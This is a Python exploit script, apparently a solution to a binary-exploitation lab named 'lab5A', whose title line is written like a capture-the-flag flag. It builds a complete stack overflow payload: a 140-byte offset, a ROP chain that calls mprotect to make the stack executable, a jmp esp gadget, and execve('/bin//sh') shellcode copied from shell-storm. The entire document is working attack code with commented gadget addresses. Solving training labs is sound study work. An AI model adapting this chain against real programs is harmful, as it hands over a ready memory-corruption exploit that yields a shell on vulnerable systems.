# lab5A: th4ts_th3_r0p_i_lik3_2_s33

import sys
import struct

shellcode  = "\x90" * 50
shellcode += (
# http://shell-storm.org/shellcode/files/shellcode-811.php
"\x31\xc0\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x89\xc1\x89\xc2\xb0\x0b"
"\xcd\x80\x31\xc0\x40\xcd\x80"
)

def generate_rop_chain():

  rop_gadgets = [
    0x08048dc6, # ret
    0x08048dc6, # ret
    0x08048dc6, # ret
    0x08048dc6, # ret
    #
    # EAX == mprotect(
    #   (EBX) void *addr = 0xbffdf000 (the starting address MUST be the start of a memory page),
    #   (ECX) size_t len = 0x21000 (size),
    #   (EDX) int prot = 0x07 (READ|WRITE|EXECUTE)
    # );
    #
    # generate the starting address into EBX
    0x08063a8d, # pop ebx; ret;
    0xbffdf001, #
    0x080e69ce, # dec ebx; ret; (EBX == 0xbffdf000)
    # generate the size of the memory page into ECX
    0x080e55ad, # pop ecx; ret;
    0x110f0111, #
    0x080bbf26, # pop eax; ret;
    0x11111111, #
    0x0806b80c, # sub eax,ecx; ret; (0x11111111 - 0x110f0111 = 0x21000)
    0x08049a75, # pop esi; ret;
    0x080eaff0, # ...writeable address to survive upcoming OR instruction
    0x080e5325, # xchg eax, ecx; or cl, byte ptr [esi]; adc al, 0x43; ret; (ECX == 0x21000)
    # generate the new permissions into EDX
    0x08068510, # xor eax, eax; pop edi; ret;
    0x41414141, # [...filler]
    0x080e7719, # xchg edx,eax; or cl,BYTE PTR [esi]; adc al,0x41; ret
    0x080e763f, # inc edx; ret;
    0x080e763f, # inc edx; ret;
    0x080e763f, # inc edx; ret;
    0x080e763f, # inc edx; ret;
    0x080e763f, # inc edx; ret;
    0x080e763f, # inc edx; ret;
    0x080e763f, # inc edx; ret;
    # finally generate the syscall number for sys_mprotect
    0x08068510, # xor eax, eax; pop edi; ret;
    0x41414141,
    0x080b8f6b, # add al, 0x76; ret;
    0x0808eabb, # add eax, 7; pop edi; ret;
    0x41414141,
    0x0806f320, # int 0x80; ret;
    0x080de6cf, # jmp esp;
  ]

  return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

offset    = "A" * 140
retAddr   = struct.pack('<I', 0x08048dc6)
rop_chain = generate_rop_chain()

filler = "C" * (2000 - (
  len(offset)  +
  len(retAddr) +
  len(rop_chain) +
  len(shellcode)
  )
)

exploit = offset + retAddr + rop_chain + shellcode + filler
sys.stdout.write(exploit)
